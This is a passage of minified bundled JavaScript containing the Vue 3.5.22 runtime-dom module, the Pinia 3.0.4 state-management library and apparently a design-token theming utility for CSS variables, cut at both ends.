};
function wl(e) {
  const t = (r) => {
    e.exposed = r || {};
  };
  return {
    attrs: new Proxy(e.attrs, kl),
    slots: e.slots,
    emit: e.emit,
    expose: t
  };
}
function ro(e) {
  return e.exposed ? e.exposeProxy || (e.exposeProxy = new Proxy($n(Wo(e.exposed)), {
    get(t, r) {
      if (r in t)
        return t[r];
      if (r in or)
        return or[r](e);
    },
    has(t, r) {
      return r in t || r in or;
    }
  })) : e.proxy;
}
function _l(e) {
  return H(e) && "__vccOpts" in e;
}
const Ve = (e, t) => pi(e, t, pr), Sl = "3.5.22";
/**
* @vue/runtime-dom v3.5.22
* (c) 2018-present Yuxi (Evan) You and Vue contributors
* @license MIT
**/
let Po;
const ks = typeof window < "u" && window.trustedTypes;
if (ks)
  try {
    Po = /* @__PURE__ */ ks.createPolicy("vue", {
      createHTML: (e) => e
    });
  } catch {
  }
const ia = Po ? (e) => Po.createHTML(e) : (e) => e, Cl = "http://www.w3.org/2000/svg", jl = "http://www.w3.org/1998/Math/MathML", rt = typeof document < "u" ? document : null, ws = rt && /* @__PURE__ */ rt.createElement("template"), Tl = {
  insert: (e, t, r) => {
    t.insertBefore(e, r || null);
  },
  remove: (e) => {
    const t = e.parentNode;
    t && t.removeChild(e);
  },
  createElement: (e, t, r, o) => {
    const s = t === "svg" ? rt.createElementNS(Cl, e) : t === "mathml" ? rt.createElementNS(jl, e) : r ? rt.createElement(e, { is: r }) : rt.createElement(e);
    return e === "select" && o && o.multiple != null && s.setAttribute("multiple", o.multiple), s;
  },
  createText: (e) => rt.createTextNode(e),
  createComment: (e) => rt.createComment(e),
  setText: (e, t) => {
    e.nodeValue = t;
  },
  setElementText: (e, t) => {
    e.textContent = t;
  },
  parentNode: (e) => e.parentNode,
  nextSibling: (e) => e.nextSibling,
  querySelector: (e) => rt.querySelector(e),
  setScopeId(e, t) {
    e.setAttribute(t, "");
  },
  // __UNSAFE__
  // Reason: innerHTML.
  // Static content here can only come from compiled templates.
  // As long as the user only uses trusted templates, this is safe.
  insertStaticContent(e, t, r, o, s, n) {
    const i = r ? r.previousSibling : t.lastChild;
    if (s && (s === n || s.nextSibling))
      for (; t.insertBefore(s.cloneNode(!0), r), !(s === n || !(s = s.nextSibling)); )
        ;
    else {
      ws.innerHTML = ia(
        o === "svg" ? `<svg>${e}</svg>` : o === "mathml" ? `<math>${e}</math>` : e
      );
      const a = ws.content;
      if (o === "svg" || o === "mathml") {
        const l = a.firstChild;
        for (; l.firstChild; )
          a.appendChild(l.firstChild);
        a.removeChild(l);
      }
      t.insertBefore(a, r);
    }
    return [
      // first
      i ? i.nextSibling : t.firstChild,
      // last
      r ? r.previousSibling : t.lastChild
    ];
  }
}, $l = Symbol("_vtc");
function Pl(e, t, r) {
  const o = e[$l];
  o && (t = (t ? [t, ...o] : [...o]).join(" ")), t == null ? e.removeAttribute("class") : r ? e.setAttribute("class", t) : e.className = t;
}
const Vr = Symbol("_vod"), la = Symbol("_vsh"), _s = {
  // used for prop mismatch check during hydration
  name: "show",
  beforeMount(e, { value: t }, { transition: r }) {
    e[Vr] = e.style.display === "none" ? "" : e.style.display, r && t ? r.beforeEnter(e) : Yt(e, t);
  },
  mounted(e, { value: t }, { transition: r }) {
    r && t && r.enter(e);
  },
  updated(e, { value: t, oldValue: r }, { transition: o }) {
    !t != !r && (o ? t ? (o.beforeEnter(e), Yt(e, !0), o.enter(e)) : o.leave(e, () => {
      Yt(e, !1);
    }) : Yt(e, t));
  },
  beforeUnmount(e, { value: t }) {
    Yt(e, t);
  }
};
function Yt(e, t) {
  e.style.display = t ? e[Vr] : "none", e[la] = !t;
}
const Ol = Symbol(""), Al = /(?:^|;)\s*display\s*:/;
function El(e, t, r) {
  const o = e.style, s = ce(r);
  let n = !1;
  if (r && !s) {
    if (t)
      if (ce(t))
        for (const i of t.split(";")) {
          const a = i.slice(0, i.indexOf(":")).trim();
          r[a] == null && Ar(o, a, "");
        }
      else
        for (const i in t)
          r[i] == null && Ar(o, i, "");
    for (const i in r)
      i === "display" && (n = !0), Ar(o, i, r[i]);
  } else if (s) {
    if (t !== r) {
      const i = o[Ol];
      i && (r += ";" + i), o.cssText = r, n = Al.test(r);
    }
  } else t && e.removeAttribute("style");
  Vr in e && (e[Vr] = n ? o.display : "", e[la] && (o.display = "none"));
}
const Ss = /\s*!important$/;
function Ar(e, t, r) {
  if (M(r))
    r.forEach((o) => Ar(e, t, o));
  else if (r == null && (r = ""), t.startsWith("--"))
    e.setProperty(t, r);
  else {
    const o = Il(e, t);
    Ss.test(r) ? e.setProperty(
      At(o),
      r.replace(Ss, ""),
      "important"
    ) : e[o] = r;
  }
}
const Cs = ["Webkit", "Moz", "ms"], po = {};
function Il(e, t) {
  const r = po[t];
  if (r)
    return r;
  let o = mt(t);
  if (o !== "filter" && o in e)
    return po[t] = o;
  o = sn(o);
  for (let s = 0; s < Cs.length; s++) {
    const n = Cs[s] + o;
    if (n in e)
      return po[t] = n;
  }
  return t;
}
const js = "http://www.w3.org/1999/xlink";
function Ts(e, t, r, o, s, n = Na(t)) {
  o && t.startsWith("xlink:") ? r == null ? e.removeAttributeNS(js, t.slice(6, t.length)) : e.setAttributeNS(js, t, r) : r == null || n && !an(r) ? e.removeAttribute(t) : e.setAttribute(
    t,
    n ? "" : Qe(r) ? String(r) : r
  );
}
function $s(e, t, r, o, s) {
  if (t === "innerHTML" || t === "textContent") {
    r != null && (e[t] = t === "innerHTML" ? ia(r) : r);
    return;
  }
  const n = e.tagName;
  if (t === "value" && n !== "PROGRESS" && // custom elements may use _value internally
  !n.includes("-")) {
    const a = n === "OPTION" ? e.getAttribute("value") || "" : e.value, l = r == null ? (
      // #11647: value should be set as empty string for null and undefined,
      // but <input type="checkbox"> should be set as 'on'.
      e.type === "checkbox" ? "on" : ""
    ) : String(r);
    (a !== l || !("_value" in e)) && (e.value = l), r == null && e.removeAttribute(t), e._value = r;
    return;
  }
  let i = !1;
  if (r === "" || r == null) {
    const a = typeof e[t];
    a === "boolean" ? r = an(r) : r == null && a === "string" ? (r = "", i = !0) : a === "number" && (r = 0, i = !0);
  }
  try {
    e[t] = r;
  } catch {
  }
  i && e.removeAttribute(s || t);
}
function jt(e, t, r, o) {
  e.addEventListener(t, r, o);
}
function zl(e, t, r, o) {
  e.removeEventListener(t, r, o);
}
const Ps = Symbol("_vei");
function Rl(e, t, r, o, s = null) {
  const n = e[Ps] || (e[Ps] = {}), i = n[t];
  if (o && i)
    i.value = o;
  else {
    const [a, l] = Ll(t);
    if (o) {
      const u = n[t] = Fl(
        o,
        s
      );
      jt(e, a, u, l);
    } else i && (zl(e, a, i, l), n[t] = void 0);
  }
}
const Os = /(?:Once|Passive|Capture)$/;
function Ll(e) {
  let t;
  if (Os.test(e)) {
    t = {};
    let o;
    for (; o = e.match(Os); )
      e = e.slice(0, e.length - o[0].length), t[o[0].toLowerCase()] = !0;
  }
  return [e[2] === ":" ? e.slice(3) : At(e.slice(2)), t];
}
let bo = 0;
const Nl = /* @__PURE__ */ Promise.resolve(), Ml = () => bo || (Nl.then(() => bo = 0), bo = Date.now());
function Fl(e, t) {
  const r = (o) => {
    if (!o._vts)
      o._vts = Date.now();
    else if (o._vts <= r.attached)
      return;
    Ze(
      Dl(o, r.value),
      t,
      5,
      [o]
    );
  };
  return r.value = e, r.attached = Ml(), r;
}
function Dl(e, t) {
  if (M(t)) {
    const r = e.stopImmediatePropagation;
    return e.stopImmediatePropagation = () => {
      r.call(e), e._stopped = !0;
    }, t.map(
      (o) => (s) => !s._stopped && o && o(s)
    );
  } else
    return t;
}
const As = (e) => e.charCodeAt(0) === 111 && e.charCodeAt(1) === 110 && // lowercase letter
e.charCodeAt(2) > 96 && e.charCodeAt(2) < 123, Vl = (e, t, r, o, s, n) => {
  const i = s === "svg";
  t === "class" ? Pl(e, o, i) : t === "style" ? El(e, r, o) : Wr(t) ? Ro(t) || Rl(e, t, r, o, n) : (t[0] === "." ? (t = t.slice(1), !0) : t[0] === "^" ? (t = t.slice(1), !1) : Bl(e, t, o, i)) ? ($s(e, t, o), !e.tagName.includes("-") && (t === "value" || t === "checked" || t === "selected") && Ts(e, t, o, i, n, t !== "value")) : /* #11081 force set props for possible async custom element */ e._isVueCE && (/[A-Z]/.test(t) || !ce(o)) ? $s(e, mt(t), o, n, t) : (t === "true-value" ? e._trueValue = o : t === "false-value" && (e._falseValue = o), Ts(e, t, o, i));
};
function Bl(e, t, r, o) {
  if (o)
    return !!(t === "innerHTML" || t === "textContent" || t in e && As(t) && H(r));
  if (t === "spellcheck" || t === "draggable" || t === "translate" || t === "autocorrect" || t === "form" || t === "list" && e.tagName === "INPUT" || t === "type" && e.tagName === "TEXTAREA")
    return !1;
  if (t === "width" || t === "height") {
    const s = e.tagName;
    if (s === "IMG" || s === "VIDEO" || s === "CANVAS" || s === "SOURCE")
      return !1;
  }
  return As(t) && ce(r) ? !1 : t in e;
}
const Br = (e) => {
  const t = e.props["onUpdate:modelValue"] || !1;
  return M(t) ? (r) => Pr(t, r) : t;
};
function Kl(e) {
  e.target.composing = !0;
}
function Es(e) {
  const t = e.target;
  t.composing && (t.composing = !1, t.dispatchEvent(new Event("input")));
}
const Bt = Symbol("_assign"), jr = {
  created(e, { modifiers: { lazy: t, trim: r, number: o } }, s) {
    e[Bt] = Br(s);
    const n = o || s.props && s.props.type === "number";
    jt(e, t ? "change" : "input", (i) => {
      if (i.target.composing) return;
      let a = e.value;
      r && (a = a.trim()), n && (a = vo(a)), e[Bt](a);
    }), r && jt(e, "change", () => {
      e.value = e.value.trim();
    }), t || (jt(e, "compositionstart", Kl), jt(e, "compositionend", Es), jt(e, "change", Es));
  },
  // set value on mounted so it's after min/max for type="range"
  mounted(e, { value: t }) {
    e.value = t ?? "";
  },
  beforeUpdate(e, { value: t, oldValue: r, modifiers: { lazy: o, trim: s, number: n } }, i) {
    if (e[Bt] = Br(i), e.composing) return;
    const a = (n || e.type === "number") && !/^0\d/.test(e.value) ? vo(e.value) : e.value, l = t ?? "";
    a !== l && (document.activeElement === e && e.type !== "range" && (o && t === r || s && e.value.trim() === l) || (e.value = l));
  }
}, Hl = {
  // #4096 array checkboxes need to be deep traversed
  deep: !0,
  created(e, t, r) {
    e[Bt] = Br(r), jt(e, "change", () => {
      const o = e._modelValue, s = Wl(e), n = e.checked, i = e[Bt];
      if (M(o)) {
        const a = ln(o, s), l = a !== -1;
        if (n && !l)
          i(o.concat(s));
        else if (!n && l) {
          const u = [...o];
          u.splice(a, 1), i(u);
        }
      } else if (Jr(o)) {
        const a = new Set(o);
        n ? a.add(s) : a.delete(s), i(a);
      } else
        i(ca(e, n));
    });
  },
  // set initial checked on mount to wait for true-value/false-value
  mounted: Is,
  beforeUpdate(e, t, r) {
    e[Bt] = Br(r), Is(e, t, r);
  }
};
function Is(e, { value: t, oldValue: r }, o) {
  e._modelValue = t;
  let s;
  if (M(t))
    s = ln(t, o.props.value) > -1;
  else if (Jr(t))
    s = t.has(o.props.value);
  else {
    if (t === r) return;
    s = Yr(t, ca(e, !0));
  }
  e.checked !== s && (e.checked = s);
}
function Wl(e) {
  return "_value" in e ? e._value : e.value;
}
function ca(e, t) {
  const r = t ? "_trueValue" : "_falseValue";
  return r in e ? e[r] : t;
}
const Jl = ["ctrl", "shift", "alt", "meta"], Ul = {
  stop: (e) => e.stopPropagation(),
  prevent: (e) => e.preventDefault(),
  self: (e) => e.target !== e.currentTarget,
  ctrl: (e) => !e.ctrlKey,
  shift: (e) => !e.shiftKey,
  alt: (e) => !e.altKey,
  meta: (e) => !e.metaKey,
  left: (e) => "button" in e && e.button !== 0,
  middle: (e) => "button" in e && e.button !== 1,
  right: (e) => "button" in e && e.button !== 2,
  exact: (e, t) => Jl.some((r) => e[`${r}Key`] && !t.includes(r))
}, Gl = (e, t) => {
  const r = e._withMods || (e._withMods = {}), o = t.join(".");
  return r[o] || (r[o] = (s, ...n) => {
    for (let i = 0; i < t.length; i++) {
      const a = Ul[t[i]];
      if (a && a(s, t)) return;
    }
    return e(s, ...n);
  });
}, ql = /* @__PURE__ */ ye({ patchProp: Vl }, Tl);
let zs;
function Yl() {
  return zs || (zs = Xi(ql));
}
const Xl = (...e) => {
  const t = Yl().createApp(...e), { mount: r } = t;
  return t.mount = (o) => {
    const s = Zl(o);
    if (!s) return;
    const n = t._component;
    !H(n) && !n.render && !n.template && (n.template = s.innerHTML), s.nodeType === 1 && (s.textContent = "");
    const i = r(s, !1, Ql(s));
    return s instanceof Element && (s.removeAttribute("v-cloak"), s.setAttribute("data-v-app", "")), i;
  }, t;
};
function Ql(e) {
  if (e instanceof SVGElement)
    return "svg";
  if (typeof MathMLElement == "function" && e instanceof MathMLElement)
    return "mathml";
}
function Zl(e) {
  return ce(e) ? document.querySelector(e) : e;
}
/*!
 * pinia v3.0.4
 * (c) 2025 Eduardo San Martin Morote
 * @license MIT
 */
let ua;
const oo = (e) => ua = e, da = (
  /* istanbul ignore next */
  Symbol()
);
function Oo(e) {
  return e && typeof e == "object" && Object.prototype.toString.call(e) === "[object Object]" && typeof e.toJSON != "function";
}
var ar;
(function(e) {
  e.direct = "direct", e.patchObject = "patch object", e.patchFunction = "patch function";
})(ar || (ar = {}));
function ec() {
  const e = fn(!0), t = e.run(() => ue({}));
  let r = [], o = [];
  const s = Wo({
    install(n) {
      oo(s), s._a = n, n.provide(da, s), n.config.globalProperties.$pinia = s, o.forEach((i) => r.push(i)), o = [];
    },
    use(n) {
      return this._a ? r.push(n) : o.push(n), this;
    },
    _p: r,
    // it's actually undefined here
    // @ts-expect-error
    _a: null,
    _e: e,
    _s: /* @__PURE__ */ new Map(),
    state: t
  });
  return s;
}
const fa = () => {
};
function Rs(e, t, r, o = fa) {
  e.add(t);
  const s = () => {
    e.delete(t) && o();
  };
  return !r && pn() && Fa(s), s;
}
function zt(e, ...t) {
  e.forEach((r) => {
    r(...t);
  });
}
const tc = (e) => e(), Ls = Symbol(), go = Symbol();
function Ao(e, t) {
  e instanceof Map && t instanceof Map ? t.forEach((r, o) => e.set(o, r)) : e instanceof Set && t instanceof Set && t.forEach(e.add, e);
  for (const r in t) {
    if (!t.hasOwnProperty(r))
      continue;
    const o = t[r], s = e[r];
    Oo(s) && Oo(o) && e.hasOwnProperty(r) && !le(o) && !ht(o) ? e[r] = Ao(s, o) : e[r] = o;
  }
  return e;
}
const rc = (
  /* istanbul ignore next */
  Symbol()
);
function oc(e) {
  return !Oo(e) || !Object.prototype.hasOwnProperty.call(e, rc);
}
const { assign: ft } = Object;
function sc(e) {
  return !!(le(e) && e.effect);
}
function nc(e, t, r, o) {
  const { state: s, actions: n, getters: i } = t, a = r.state.value[e];
  let l;
  function u() {
    a || (r.state.value[e] = s ? s() : {});
    const c = ci(r.state.value[e]);
    return ft(c, n, Object.keys(i || {}).reduce((p, m) => (p[m] = Wo(Ve(() => {
      oo(r);
      const g = r._s.get(e);
      return i[m].call(g, g);
    })), p), {}));
  }
  return l = pa(e, u, t, r, o, !0), l;
}
function pa(e, t, r = {}, o, s, n) {
  let i;
  const a = ft({ actions: {} }, r), l = { deep: !0 };
  let u, c, p = /* @__PURE__ */ new Set(), m = /* @__PURE__ */ new Set(), g;
  const h = o.state.value[e];
  !n && !h && (o.state.value[e] = {}), ue({});
  let b;
  function C(K) {
    let W;
    u = c = !1, typeof K == "function" ? (K(o.state.value[e]), W = {
      type: ar.patchFunction,
      storeId: e,
      events: g
    }) : (Ao(o.state.value[e], K), W = {
      type: ar.patchObject,
      payload: K,
      storeId: e,
      events: g
    });
    const Q = b = Symbol();
    Jo().then(() => {
      b === Q && (u = !0);
    }), c = !0, zt(p, W, o.state.value[e]);
  }
  const I = n ? function() {
    const { state: W } = r, Q = W ? W() : {};
    this.$patch((ie) => {
      ft(ie, Q);
    });
  } : (
    /* istanbul ignore next */
    fa
  );
  function R() {
    i.stop(), p.clear(), m.clear(), o._s.delete(e);
  }
  const F = (K, W = "") => {
    if (Ls in K)
      return K[go] = W, K;
    const Q = function() {
      oo(o);
      const ie = Array.from(arguments), de = /* @__PURE__ */ new Set(), ge = /* @__PURE__ */ new Set();
      function Se(V) {
        de.add(V);
      }
      function Ie(V) {
        ge.add(V);
      }
      zt(m, {
        args: ie,
        name: Q[go],
        store: B,
        after: Se,
        onError: Ie
      });
      let Z;
      try {
        Z = K.apply(this && this.$id === e ? this : B, ie);
      } catch (V) {
        throw zt(ge, V), V;
      }
      return Z instanceof Promise ? Z.then((V) => (zt(de, V), V)).catch((V) => (zt(ge, V), Promise.reject(V))) : (zt(de, Z), Z);
    };
    return Q[Ls] = !0, Q[go] = W, Q;
  }, O = {
    _p: o,
    // _s: scope,
    $id: e,
    $onAction: Rs.bind(null, m),
    $patch: C,
    $reset: I,
    $subscribe(K, W = {}) {
      const Q = Rs(p, K, W.detached, () => ie()), ie = i.run(() => Ye(() => o.state.value[e], (de) => {
        (W.flush === "sync" ? c : u) && K({
          storeId: e,
          type: ar.direct,
          events: g
        }, de);
      }, ft({}, l, W)));
      return Q;
    },
    $dispose: R
  }, B = Wt(O);
  o._s.set(e, B);
  const ee = (o._a && o._a.runWithContext || tc)(() => o._e.run(() => (i = fn()).run(() => t({ action: F }))));
  for (const K in ee) {
    const W = ee[K];
    if (le(W) && !sc(W) || ht(W))
      n || (h && oc(W) && (le(W) ? W.value = h[K] : Ao(W, h[K])), o.state.value[e][K] = W);
    else if (typeof W == "function") {
      const Q = F(W, K);
      ee[K] = Q, a.actions[K] = W;
    }
  }
  return ft(B, ee), ft(G(B), ee), Object.defineProperty(B, "$state", {
    get: () => o.state.value[e],
    set: (K) => {
      C((W) => {
        ft(W, K);
      });
    }
  }), o._p.forEach((K) => {
    ft(B, i.run(() => K({
      store: B,
      app: o._a,
      pinia: o,
      options: a
    })));
  }), h && n && r.hydrate && r.hydrate(B.$state, h), u = !0, c = !0, B;
}
/*! #__NO_SIDE_EFFECTS__ */
// @__NO_SIDE_EFFECTS__
function ba(e, t, r) {
  let o;
  const s = typeof t == "function";
  o = s ? r : t;
  function n(i, a) {
    const l = Hi();
    return i = // in test mode, ignore the argument provided as we can always retrieve a
    // pinia instance with getActivePinia()
    i || (l ? sr(da, null) : null), i && oo(i), i = ua, i._s.has(e) || (s ? pa(e, t, o, i) : nc(e, o, i)), i._s.get(e);
  }
  return n.$id = e, n;
}
var ac = Object.defineProperty, Ns = Object.getOwnPropertySymbols, ic = Object.prototype.hasOwnProperty, lc = Object.prototype.propertyIsEnumerable, Ms = (e, t, r) => t in e ? ac(e, t, { enumerable: !0, configurable: !0, writable: !0, value: r }) : e[t] = r, cc = (e, t) => {
  for (var r in t || (t = {}))
    ic.call(t, r) && Ms(e, r, t[r]);
  if (Ns)
    for (var r of Ns(t))
      lc.call(t, r) && Ms(e, r, t[r]);
  return e;
};
function Zo(e) {
  return e == null || e === "" || Array.isArray(e) && e.length === 0 || !(e instanceof Date) && typeof e == "object" && Object.keys(e).length === 0;
}
function uc(e) {
  return !!(e && e.constructor && e.call && e.apply);
}
function ae(e) {
  return !Zo(e);
}
function Ot(e, t = !0) {
  return e instanceof Object && e.constructor === Object && (t || Object.keys(e).length !== 0);
}
function Tt(e, ...t) {
  return uc(e) ? e(...t) : e;
}
function Ht(e, t = !0) {
  return typeof e == "string" && (t || e !== "");
}
function ga(e, t = !0) {
  return Array.isArray(e) && (t || e.length !== 0);
}
function ha(e) {
  return ae(e) && !isNaN(e);
}
function at(e, t) {
  if (t) {
    const r = t.test(e);
    return t.lastIndex = 0, r;
  }
  return !1;
}
function dc(...e) {
  const t = (r = {}, o = {}) => {
    const s = cc({}, r);
    return Object.keys(o).forEach((n) => {
      Ot(o[n]) && n in r && Ot(r[n]) ? s[n] = t(r[n], o[n]) : s[n] = o[n];
    }), s;
  };
  return e.reduce((r, o, s) => s === 0 ? o : t(r, o), {});
}
function ir(e) {
  return e && e.replace(/\/\*(?:(?!\*\/)[\s\S])*\*\/|[\r\n\t]+/g, "").replace(/ {2,}/g, " ").replace(/ ([{:}]) /g, "$1").replace(/([;,]) /g, "$1").replace(/ !/g, "!").replace(/: /g, ":");
}
function ma(e) {
  return Ht(e) ? e.replace(/(_)/g, "-").replace(/[A-Z]/g, (t, r) => r === 0 ? t : "-" + t.toLowerCase()).toLowerCase() : e;
}
function Fs(e) {
  return Ht(e) ? e.replace(/[A-Z]/g, (t, r) => r === 0 ? t : "." + t.toLowerCase()).toLowerCase() : e;
}
function xa() {
  const e = /* @__PURE__ */ new Map();
  return {
    on(t, r) {
      let o = e.get(t);
      return o ? o.push(r) : o = [r], e.set(t, o), this;
    },
    off(t, r) {
      let o = e.get(t);
      return o && o.splice(o.indexOf(r) >>> 0, 1), this;
    },
    emit(t, r) {
      let o = e.get(t);
      o && o.slice().map((s) => {
        s(r);
      });
    },
    clear() {
      e.clear();
    }
  };
}
var fc = Object.defineProperty, pc = Object.defineProperties, bc = Object.getOwnPropertyDescriptors, Kr = Object.getOwnPropertySymbols, va = Object.prototype.hasOwnProperty, ya = Object.prototype.propertyIsEnumerable, Ds = (e, t, r) => t in e ? fc(e, t, { enumerable: !0, configurable: !0, writable: !0, value: r }) : e[t] = r, Fe = (e, t) => {
  for (var r in t || (t = {}))
    va.call(t, r) && Ds(e, r, t[r]);
  if (Kr)
    for (var r of Kr(t))
      ya.call(t, r) && Ds(e, r, t[r]);
  return e;
}, ho = (e, t) => pc(e, bc(t)), tt = (e, t) => {
  var r = {};
  for (var o in e)
    va.call(e, o) && t.indexOf(o) < 0 && (r[o] = e[o]);
  if (e != null && Kr)
    for (var o of Kr(e))
      t.indexOf(o) < 0 && ya.call(e, o) && (r[o] = e[o]);
  return r;
}, gc = xa(), ot = gc;
function Vs(e, t) {
  ga(e) ? e.push(...t || []) : Ot(e) && Object.assign(e, t);
}
function hc(e) {
  return Ot(e) && e.hasOwnProperty("value") && e.hasOwnProperty("type") ? e.value : e;
}
function Bs(e, t = "") {
  return ["opacity", "z-index", "line-height", "font-weight", "flex", "flex-grow", "flex-shrink", "order"].some((o) => t.endsWith(o)) ? e : `${e}`.trim().split(" ").map((n) => ha(n) ? `${n}px` : n).join(" ");
}
function mc(e) {
  return e.replaceAll(/ /g, "").replace(/[^\w]/g, "-");
}
function Eo(e = "", t = "") {
  return mc(`${Ht(e, !1) && Ht(t, !1) ? `${e}-` : e}${t}`);
}
function ka(e = "", t = "") {
  return `--${Eo(e, t)}`;
}
function wa(e, t = "", r = "", o = [], s) {
  if (Ht(e)) {
    const n = /{([^}]*)}/g, i = e.trim();
    if (at(i, n)) {
      const a = i.replaceAll(n, (c) => {
        const m = c.replace(/{|}/g, "").split(".").filter((g) => !o.some((h) => at(g, h)));
        return `var(${ka(r, ma(m.join("-")))}${ae(s) ? `, ${s}` : ""})`;
      }), l = /(\d+\s+[\+\-\*\/]\s+\d+)/g, u = /var\([^)]+\)/g;
      return at(a.replace(u, "0"), l) ? `calc(${a})` : a;
    }
    return Bs(i, t);
  } else if (ha(e))
    return Bs(e, t);
}
function xc(e, t, r) {
  Ht(t, !1) && e.push(`${t}:${r};`);
}
function Nt(e, t) {
  return e ? `${e}{${t}}` : "";
}
var lr = (...e) => vc(xe.getTheme(), ...e), vc = (e = {}, t, r, o) => {
  if (t) {
    const { variable: s, options: n } = xe.defaults || {}, { prefix: i, transform: a } = (e == null ? void 0 : e.options) || n || {}, u = at(t, /{([^}]*)}/g) ? t : `{${t}}`;
    return o === "value" || Zo(o) && a === "strict" ? xe.getTokenValue(t) : wa(u, void 0, i, [s.excludedKeyRegex], r);
  }
  return "";
};
function yc(e, t = {}) {
  const r = xe.defaults.variable, { prefix: o = r.prefix, selector: s = r.selector, excludedKeyRegex: n = r.excludedKeyRegex } = t, i = (u, c = "") => Object.entries(u).reduce(
    (p, [m, g]) => {
      const h = at(m, n) ? Eo(c) : Eo(c, ma(m)), b = hc(g);
      if (Ot(b)) {
        const { variables: C, tokens: I } = i(b, h);
        Vs(p.tokens, I), Vs(p.variables, C);
      } else
        p.tokens.push((o ? h.replace(`${o}-`, "") : h).replaceAll("-", ".")), xc(p.variables, ka(h), wa(b, h, o, [n]));
      return p;
    },
    { variables: [], tokens: [] }
  ), { variables: a, tokens: l } = i(e, o);
  return {
    value: a,
    tokens: l,
    declarations: a.join(""),
    css: Nt(s, a.join(""))
  };
}
var Ne = {
  regex: {
    rules: {
      class: {
        pattern: /^\.([a-zA-Z][\w-]*)$/,
        resolve(e) {
          return { type: "class", selector: e, matched: this.pattern.test(e.trim()) };
        }
      },
      attr: {
        pattern: /^\[(.*)\]$/,
        resolve(e) {
          return { type: "attr", selector: `:root${e}`, matched: this.pattern.test(e.trim()) };
        }
      },
      media: {
        pattern: /^@media (.*)$/,
        resolve(e) {
          return { type: "media", selector: `${e}{:root{[CSS]}}`, matched: this.pattern.test(e.trim()) };
        }
      },
      system: {
        pattern: /^system$/,
        resolve(e) {
          return { type: "system", selector: "@media (prefers-color-scheme: dark){:root{[CSS]}}", matched: this.pattern.test(e.trim()) };
        }
      },
      custom: {
        resolve(e) {
          return { type: "custom", selector: e, matched: !0 };
        }
      }
    },
    resolve(e) {
      const t = Object.keys(this.rules).filter((r) => r !== "custom").map((r) => this.rules[r]);
      return [e].flat().map((r) => {
        var o;
        return (o = t.map((s) => s.resolve(r)).find((s) => s.matched)) != null ? o : this.rules.custom.resolve(r);
      });
    }
  },
  _toVariables(e, t) {
    return yc(e, { prefix: t == null ? void 0 : t.prefix });
  },
  getCommon({ name: e = "", theme: t = {}, params: r, set: o, defaults: s }) {
    var n, i, a, l, u, c, p;
    const { preset: m, options: g } = t;
    let h, b, C, I, R, F, O;
    if (ae(m) && g.transform !== "strict") {
      const { primitive: B, semantic: q, extend: ee } = m, K = q || {}, { colorScheme: W } = K, Q = tt(K, ["colorScheme"]), ie = ee || {}, { colorScheme: de } = ie, ge = tt(ie, ["colorScheme"]), Se = W || {}, { dark: Ie } = Se, Z = tt(Se, ["dark"]), V = de || {}, { dark: U } = V, Ce = tt(V, ["dark"]), je = ae(B) ? this._toVariables({ primitive: B }, g) : {}, fe = ae(Q) ? this._toVariables({ semantic: Q }, g) : {}, pe = ae(Z) ? this._toVariables({ light: Z }, g) : {}, yt = ae(Ie) ? this._toVariables({ dark: Ie }, g) : {}, ut = ae(ge) ? this._toVariables({ semantic: ge }, g) : {}, kr = ae(Ce) ? this._toVariables({ light: Ce }, g) : {}, dt = ae(U) ? this._toVariables({ dark: U }, g) : {}, [Et, Jt] = [(n = je.declarations) != null ? n : "", je.tokens], [wr, kt] = [(i = fe.declarations) != null ? i : "", fe.tokens || []], [es, d] = [(a = pe.declarations) != null ? a : "", pe.tokens || []], [f, v] = [(l = yt.declarations) != null ? l : "", yt.tokens || []], [w, y] = [(u = ut.declarations) != null ? u : "", ut.tokens || []], [k, T] = [(c = kr.declarations) != null ? c : "", kr.tokens || []], [j, S] = [(p = dt.declarations) != null ? p : "", dt.tokens || []];
      h = this.transformCSS(e, Et, "light", "variable", g, o, s), b = Jt;
      const _ = this.transformCSS(e, `${wr}${es}`, "light", "variable", g, o, s), N = this.transformCSS(e, `${f}`, "dark", "variable", g, o, s);
      C = `${_}${N}`, I = [.../* @__PURE__ */ new Set([...kt, ...d, ...v])];
      const $ = this.transformCSS(e, `${w}${k}color-scheme:light`, "light", "variable", g, o, s), z = this.transformCSS(e, `${j}color-scheme:dark`, "dark", "variable", g, o, s);
      R = `${$}${z}`, F = [.../* @__PURE__ */ new Set([...y, ...T, ...S])], O = Tt(m.css, { dt: lr });
    }
    return {
      primitive: {
        css: h,
        tokens: b
      },
      semantic: {
        css: C,
        tokens: I
      },
      global: {
        css: R,
        tokens: F
      },
      style: O
    };
  },
  getPreset({ name: e = "", preset: t = {}, options: r, params: o, set: s, defaults: n, selector: i }) {
    var a, l, u;
    let c, p, m;
    if (ae(t) && r.transform !== "strict") {
      const g = e.replace("-directive", ""), h = t, { colorScheme: b, extend: C, css: I } = h, R = tt(h, ["colorScheme", "extend", "css"]), F = C || {}, { colorScheme: O } = F, B = tt(F, ["colorScheme"]), q = b || {}, { dark: ee } = q, K = tt(q, ["dark"]), W = O || {}, { dark: Q } = W, ie = tt(W, ["dark"]), de = ae(R) ? this._toVariables({ [g]: Fe(Fe({}, R), B) }, r) : {}, ge = ae(K) ? this._toVariables({ [g]: Fe(Fe({}, K), ie) }, r) : {}, Se = ae(ee) ? this._toVariables({ [g]: Fe(Fe({}, ee), Q) }, r) : {}, [Ie, Z] = [(a = de.declarations) != null ? a : "", de.tokens || []], [V, U] = [(l = ge.declarations) != null ? l : "", ge.tokens || []], [Ce, je] = [(u = Se.declarations) != null ? u : "", Se.tokens || []], fe = this.transformCSS(g, `${Ie}${V}`, "light", "variable", r, s, n, i), pe = this.transformCSS(g, Ce, "dark", "variable", r, s, n, i);
      c = `${fe}${pe}`, p = [.../* @__PURE__ */ new Set([...Z, ...U, ...je])], m = Tt(I, { dt: lr });
    }
    return {
      css: c,
      tokens: p,
      style: m
    };
  },
  getPresetC({ name: e = "", theme: t = {}, params: r, set: o, defaults: s }) {
    var n;
    const { preset: i, options: a } = t, l = (n = i == null ? void 0 : i.components) == null ? void 0 : n[e];
    return this.getPreset({ name: e, preset: l, options: a, params: r, set: o, defaults: s });
  },
  getPresetD({ name: e = "", theme: t = {}, params: r, set: o, defaults: s }) {
    var n;
    const i = e.replace("-directive", ""), { preset: a, options: l } = t, u = (n = a == null ? void 0 : a.directives) == null ? void 0 : n[i];
    return this.getPreset({ name: i, preset: u, options: l, params: r, set: o, defaults: s });
  },
  applyDarkColorScheme(e) {
    return !(e.darkModeSelector === "none" || e.darkModeSelector === !1);
  },
  getColorSchemeOption(e, t) {
    var r;
